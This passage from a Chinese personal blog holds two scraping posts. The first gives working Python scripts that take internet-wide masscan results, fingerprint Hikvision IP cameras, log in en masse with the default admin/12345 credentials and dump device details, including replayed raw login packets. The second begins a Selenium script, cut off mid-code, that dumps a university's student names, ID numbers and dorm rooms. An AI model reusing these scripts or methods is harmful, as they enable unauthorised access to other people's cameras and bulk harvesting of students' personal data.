<p>速度很快，这已经到我无线上行的顶峰了，旁边打游戏的同学不要打我ლ(╹◡╹ლ)。喝杯水，看会有爱的<a href="http://eloquentjavascript.net/09_regexp.html" target="_blank" rel="external">eloquent javascript</a>，设定下终端静默时提醒，嗯，好像终端提醒这种神器只有<a href="https://yakuake.kde.org" target="_blank" rel="external">yakuake</a>会有~^_^~</p>
<p><img src="/images/spider/net_scan_1.png" alt=""></p>
<p>我们接下来要处理下这些开放80端口的ip，我们把开放80端口的服务器都模拟请求一次，这样就获得每个ip对应的服务器信息。<a href="https://github.com/robertdavidgraham/masscan/search?utf8=%E2%9C%93&amp;q=HTTP%2FGET+" target="_blank" rel="external">其实这一步我们可以改masscan源码，这样上一步扫描的时候就能把服务器返回信息返回，我们愉快的解析成想要的格式就行</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取server dict</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">20</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/open_port/open80_ip.list'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ips = f.readlines()</span><br><span class="line"></span><br><span class="line">ips = [ip.strip() <span class="keyword">for</span> ip <span class="keyword">in</span> ips]</span><br><span class="line"><span class="comment"># 移除开头和结尾的无关信息</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    ips.remove(<span class="string">'#masscan'</span>)</span><br><span class="line">    <span class="comment"># ips.remove('# end')</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ips.remove(<span class="string">'saddr'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    ips.remove(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># 保存80端口响应</span></span><br><span class="line">server_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_service</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test"</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip,</span><br><span class="line">                  verify=<span class="keyword">False</span>,</span><br><span class="line">                  allow_redirects=<span class="keyword">True</span>,</span><br><span class="line">                  timeout=<span class="number">20</span>)</span><br><span class="line">        server_dict[ip] = r</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">30</span>)</span><br><span class="line">pool.join(timeout=<span class="number">20</span>)</span><br><span class="line">pool.map(check_service, ips)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Dumping port-80 response..."</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(server_dict, f)</span><br></pre></td></tr></table></figure>
<p>好吧，monkey_patch,gevent这点非常适合这种quick&amp;dirty的脏活累活，就像我常做的事情。。。</p>
<p><img src="/images/spider/net_scan_2.png" alt=""></p>
<p>gevent是啥呢？不知道的自己谷歌吧，我也不知道是啥，据说是对libev的封装，据说是协程、据说是yield，据说yield是好像操作系统完成一次任务切换，据说操作系统任务切换在x86下要靠TSS，据说…</p>
<p>总之，你阻塞的每次请求变成了可以并发的请求。这里的坑我不想说，因为我不懂= =，但你可以自己试试不用gevent的版本。</p>
<p>另外，这里会比masscan慢上无数倍，masscan用用户态的网络栈来实现无状态了，我们这里则是用着系统提供的网络栈。</p>
<p>接下来，该看看怎么获取某种摄像头的“基因”并且批量登录了，这之前已经提到过，用浏览器检查整个过程。找到其特点。</p>
<p><img src="/images/spider/net_scan_3.png" alt=""></p>
<p>我觉得这东西就是其特点了<span>´ ▽ ` )ﾉ</span></p>
<p>对符合特点的ip地址，我们不妨试着登录下。果然跳转到另一个页面了。分析下如何登录的吧</p>
<p>这种默认用户名密码上网一搜就搜到了= =</p>
<p><img src="/images/spider/net_scan_4.png" alt=""></p>
<p><img src="/images/spider/net_scan_5.png" alt=""></p>
<p>同理，我们可以找到设备信息的地址。万事具备，只剩代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取摄像头信息框架</span><br><span class="line">输入：</span><br><span class="line">- 特征字符串</span><br><span class="line">- 获取信息方法。同步/异步</span><br><span class="line">输出：</span><br><span class="line">编号文件camera_num</span><br><span class="line">id:name:username:password</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"><span class="comment"># Hikvision: 可登录验证</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_1 = &#123;&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-"</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'doc/page/login.asp'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line">        t_1[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第一种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.auth = (<span class="string">'admin'</span>, <span class="string">'12345'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/PSIA/System/deviceInfo'</span>)</span><br><span class="line">        <span class="keyword">if</span> r.ok:</span><br><span class="line">            t_1[ip] = r.content</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/ISAPI/System/deviceInfo'</span>)</span><br><span class="line">            <span class="keyword">if</span> r.ok:</span><br><span class="line">                t_1[ip] = r.content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_1[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">300</span>)</span><br><span class="line">pool.join(timeout=<span class="number">100</span>)</span><br><span class="line">pool.map(device_info, [ip <span class="keyword">for</span> ip <span class="keyword">in</span> t_1.keys()])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 1 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_1, f)</span><br></pre></td></tr></table></figure>
<p><img src="/images/spider/net_scan_6.png" alt=""></p>
<p>获取的设备信息是xml格式的，我们可以自由的利用python的xml库进行解析，进行数据分析等等。</p>
<p>另外，有很多摄像头要求浏览器安装自己的浏览器activex插件，我们可以用wireshark或类似东西抓下包，找到其相关信息的位置，然后猜测解析协议。比如，另一种摄像头</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">t_2</span><br><span class="line">OCX</span><br><span class="line">"""</span></span><br><span class="line"><span class="comment"># <span class="doctag">FIXME:</span> 经常失败？</span></span><br><span class="line"><span class="comment"># 目前想法是控制timeout</span></span><br><span class="line"><span class="comment"># 多次请求后成功率变高？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">2</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find IP Camera Type 2"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:(ObjectX, check disabled)"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_2 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'NetOCX'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        t_2[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第二种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test "</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">        s.send(<span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        login_rt = <span class="string">"\x00\x00\x00L'\x00\x00\x00\x00\x00\x00'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">if</span> data != login_rt:</span><br><span class="line">            t_2[ip] = <span class="string">''</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 首先是个seq</span></span><br><span class="line">            <span class="comment"># 可能无效包，但测试必须有后面才正常</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">                seq_req = <span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00z\xdaf\x00\x8d\x16\xd2~\x9dU\x05\xf1\x1fi\xbb\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\xd0\xa2|\xa6v\xbd\xf3\x1eO\xd1\xcb\xdc\xae\xcbd"</span></span><br><span class="line">                s.send(seq_req)</span><br><span class="line">                seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">del</span> seq_ret</span><br><span class="line">                s.close()</span><br><span class="line">            <span class="comment"># 然后是name_seq</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            name_seq_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(name_seq_req)</span><br><span class="line">            name_seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "name_seq_ret: ", name_seq_ret</span></span><br><span class="line">            s.close()</span><br><span class="line">            <span class="comment"># 其次是chanel</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            chanel_req = <span class="string">"\x00\x00\x00$Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x022\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00\x00\x00\x00\x01"</span></span><br><span class="line">            s.send(chanel_req)</span><br><span class="line">            chanel_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "Chanle_ret: ", chanel_ret</span></span><br><span class="line">            <span class="comment"># 再来解析mac地址</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            mac_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(mac_req)</span><br><span class="line">            mac_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            s.close()</span><br><span class="line">            t_2[ip] = &#123;<span class="string">'chanel'</span>: chanel_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>).decode(<span class="string">'gbk'</span>),</span><br><span class="line">                       <span class="string">'server_name'</span>: name_seq_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'seqnum'</span>: name_seq_ret[<span class="number">60</span>:<span class="number">100</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'mac'</span>: <span class="string">"%02x:%02x:%02x:%02x:%02x:%02x:"</span> % struct.unpack(<span class="string">'BBBBBB'</span>, mac_ret[<span class="number">36</span>:<span class="number">42</span>])&#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_2[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> t_2.keys():</span><br><span class="line">    device_info(ip)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 2 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_2.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_2, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> t_2.iteritems():</span><br><span class="line">    <span class="keyword">if</span> v == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">print</span> k, <span class="string">': login failed'</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> k, <span class="string">': Ok, info dumped.'</span></span><br></pre></td></tr></table></figure>
<p>根据同样的原理，我们还可以写爬虫搜集整个局域网互联网内其它信息，比如ftp，特别是匿名ftp，sql，代理服务器啊，等等，</p>
<p>大概是知道创宇的zoomeye出来之前，我想在贵邮局域网实现shadon，一个设备杂项搜索引擎，最后，实验室太忙了= =只有个从未公开的ftp搜索web界面</p>
<p><img src="/images/spider/net_scan_7.png" alt=""></p>
<p>第一次做效率奇低，特别在加上不同的中文编码</p>
<p><img src="/images/spider/net_scan_8.png" alt=""></p>
<p>第二次好多了，如果以后有空再说吧</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/05/yingxin/" itemprop="url">
                  Python Spider: 迎新系统学生信息爬取
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-05T00:00:00+08:00" content="2015-04-05">
              2015-04-05
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/05/yingxin/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/05/yingxin/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="每一颗眼泪，是一万道光：迎新系统学生信息爬取">每一颗眼泪，是一万道光：迎新系统学生信息爬取</h2><blockquote>
<p>You don’t get over the fear. You run towards it, with your knees buckling.</p>
<p>—Amin Ariana, Technical Founder, hacker and advisor at several ventures</p>
</blockquote>
<p>有多少次，希望那短暂平凡的一刻又一刻定格到永恒。</p>
<p>简简单单就是幸福</p>
<p>忘乎所有只有热爱</p>
<hr>
<p>去年8月，来跪邮写得第一个程序。在学十还略显空荡的房间，空荡荡的桌面，床上没有被子只有个睡袋，惨白惨白的灯光和兴奋的新同学们。</p>
<p>这次，依然是selenium专场。让程序操作浏览器。</p>
<p>首先，依然是研究整个流程。</p>
<p>打开 <a href="http://welcome.bupt.edu.cn" target="_blank" rel="external">http://welcome.bupt.edu.cn</a></p>
<p>看看怎么登录</p>
<p><img src="/images/spider/yingxin.png" alt=""></p>
<p>一切显而易见，输入用户名密码，点击登录按钮。</p>
<p>进入界面</p>
<p><img src="/images/spider/yingxin1.png" alt=""></p>
<p>这时候看到有个选框，发现可以选择研究生或者本科生。在这里我不讨论这个问题，留作读者自己思考。</p>
<p>我们随便翻翻看看</p>
<p>注意到左下角有几个页码，左边还有个<code>3136/210</code>之类的东西。</p>
<p>大概研究下猜想，3136是学生总数，210是总页数。</p>
<p>同时注意到页码是一次显示5页，通过点击<code>&gt;</code>翻入下个5页。</p>
<p><img src="/images/spider/yingxin2.png" alt=""></p>
<p>为了得到我们要翻多少页，需要提取出210这个数。我们已经讲过如何用xpath来索引到对应的元素。</p>
<p><img src="/images/spider/yingxin3.png" alt=""></p>
<p>紧接着，抓取，点击下一页，每翻五页，点击<code>&gt;</code>，然后继续重复以上步骤。</p>
<p>直到把210页全翻完。</p>
<p>我们要提取的信息在class<code>porlet-table</code>中</p>
<p><img src="/images/spider/yingxin4.png" alt=""></p>
<p>接着，一切都显而易见了，用selenium自动化这个步骤。</p>
<p>我是直接在ipython中一点点试验这个过程，最后把历史记录摘录出来写成程序，最后在ipython中打开pdb自动捕捉异常的功能或者设置断点来运行调试。</p>
<p>当然，也许你使用自己的方式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment">#from selenium.webdriver.common.keys import Keys</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Reverland'</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">You know what it is...</span><br><span class="line">With NO warranty.</span><br><span class="line">At your OWN risk.</span><br><span class="line"></span><br><span class="line">A quick and dirty spider implemented with selenium webdriver</span><br><span class="line">to dump the students' dorm data</span><br><span class="line"></span><br><span class="line">条码号  姓名    院系    专业    学号    班级    宿舍校区    宿舍区  宿舍楼</span><br><span class="line">宿舍房号    床号    入住情况</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(<span class="string">"http://welcome.bupt.edu.cn"</span>)</span><br><span class="line">username = driver.find_element_by_id(<span class="string">"username"</span>)</span><br><span class="line">password = driver.find_element_by_id(<span class="string">"password"</span>)</span><br><span class="line">username.send_keys(<span class="string">"2xxxxxx"</span>)</span><br><span class="line">password.send_keys(<span class="string">"xxxxx"</span>)</span><br><span class="line">submit = driver.find_element_by_name(<span class="string">"submit"</span>)</span><br><span class="line">submit.click()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span 